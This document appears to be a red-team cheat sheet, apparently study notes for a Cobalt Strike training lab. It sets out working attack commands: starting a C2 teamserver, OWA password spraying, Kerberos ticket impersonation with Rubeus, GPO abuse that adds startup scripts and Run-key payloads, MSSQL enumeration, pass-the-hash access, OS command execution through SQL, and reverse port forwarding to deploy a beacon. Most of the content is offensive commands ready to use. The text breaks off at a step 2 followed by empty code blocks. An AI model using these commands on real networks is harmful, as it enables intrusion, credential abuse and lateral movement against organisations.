### Starting the TeamServer
```
sudo ./teamserver <host-ip> <password> <c2-profile-path>
```

### Running TeamServer as Systemd service
`/etc/systemd/system/teamserver.service`
```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=<cobaltstrike-dir>
ExecStart=<teamserver-path> <host-ip> <password> <c2-profile-path>

[Install]
WantedBy=multi-user.target
```

---
## Initial Compromise
### MailSniper Password Spraying
#### Importing
`ipmo C:\Tools\MailSniper\MailSniper.ps1`

#### Enumerating NetBIOS name for domain
`Invoke-DomainHarvestOWA -ExchHostname <mailserver-hostname>`

#### Enumerating valid email users
`Invoke-UsernameHarvestOWA -ExchHostname <mailserver-hostname> -Domain <domain> -UserList <possible-names-path> -OutFile <outfile>`

---
### Kerberos

#### Enumerating TGTs on system
```
execute-assembly <C:\Rubeus\path> triage
```
#### Creating process with TGT
```
execute-assembly <C:\Rubeus\path> createnetonly /program:C:\Windows\System32\cmd.exe /domain:<domain> /username:<user> /password:FakePass /ticket:<tgt>
```

**User can then be impersonated with:**
`beacon> steal_token <pid>`

**Practical command**
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:<tgt>
```

---
### Group Policy Objects
#### Enumerating GPOs with exploitable properties
**Requires importing Powerview**
```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```

#### Resolving GPO Display name
```
beacon> powershell Get-DomainGPO -Identity <ObjectDN> | select displayName, gpcFileSysPath
```

#### Resolving Domain Group that GPO can be modified by
```
beacon> powershell ConvertFrom-SID <SID>
```

#### Enumerating which OUs a GPO applies to
```
beacon> powershell Get-DomainOU -GPLink "<GPO-GUID>" | select distinguishedName
```

### Enumerate computers in an OU
```
beacon> powershell Get-DomainComputer -SearchBase "<OU-distinguishedname>" | select dnsHostName
```

### Adding Computer Startup Script to GPO
**Using SharpGPOAbuse**
```
beacon> execute-assembly <C:\SharpGPOAbuse\Path> --AddComputerScript --ScriptName <script-name> --ScriptContents "start /b <program-path>" --GPOName "<vuln-gpo-name>"
```

### Creating new GPOs
#### 1. Enumerate groups that can create new GPOs
```
beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
```

#### 2. Enumaerate groups that can link GPOs to OUs
```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
```

```
beacon> powershell ConvertFrom-SID <sid>
```

#### Check if GPOs can be created from Powershell
**Using Powershell RSAT modules**
```
beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
```

#### Create and link new GPO
```
beacon> powershell New-GPO -Name "<gpo-name>"
```

#### Creating an HKLM AutoRun key on the GPO'
```
beacon> powershell Set-GPPrefRegistryValue -Name "<gpo-name>" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "<value-name>" -Value "C:\Windows\System32\cmd.exe /c <payload-path>" -Type ExpandString
```

#### Applying a GPO to a target OU
```
beacon> powershell Get-GPO -Name "<gpo-name>" | New-GPLink -Target "<ou-string>"
```

---
## MS-SQL Servers
#### Tools
- PowerUpSQL
- SQLRecon

#### Enumerate MSSQL instances on domain
```
beacon> powershell Get-SQLInstanceDomain
```

#### Testing connection to SQL server
```
beacon> powershell Get-SQLConnectionTest -Instance "<hostname>,<port>" | fl
```

#### Get information about MSSQL server instance
```
beacon> powershell Get-SQLServerInfo -Instance "<hostname>,<port>"
```

#### Enumerating all accessible SQL server instances
```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```

#### Enumerating SQL Server instances using SQLRecon
```
# Enumerate SPNs
beacon> execute-assembly <C:\SQLRecon\Path> /enum:sqlspns

# Get information about instance
beacon> execute-assembly <C:\SQLRecon\Path> /auth:wintoken /host:<hostname> /module:info
```

#### Enumerate accessible roles
**Uses the beacon's token**
```
beacon> execute-assembly <C:\SQLRecon\Path> /a:wintoken /h:<hostname>,<port> /m:whoami
```

#### Find groups with users that might have SQL access
```
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
```

#### Enumerating the MSSQL service account
**Possible if the service account is kerberoastable and the password able to be cracked.**

```
beacon> execute-assembly <C:\SQLRecon\Path> /a:windomain /d:<domain> /u:<sql-svc-acc> /p:<password> /h:<hostname>,<port> /m:whoami
```

#### Accessing SQL Server with PTH
**SOCKS proxy to the network is required**.
```
proxychains mssqlclient.py <dom\user>@<ip> -hashes :<ntlm-hash> -windows-auth
```

#### Executing shell commands on MSSQL Server
**Using PowerUpSQL**
```
beacon> powershell Invoke-SQLOSCmd -Instance "<hostname>,<port>" -Command "<cmd>" -RawResults
```


#### Deploying beacon on MSSQL Server
1. Set up reverse port forward on host that can reach the TeamServer 
```
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80
```

2. 
```

```

```

```

```

```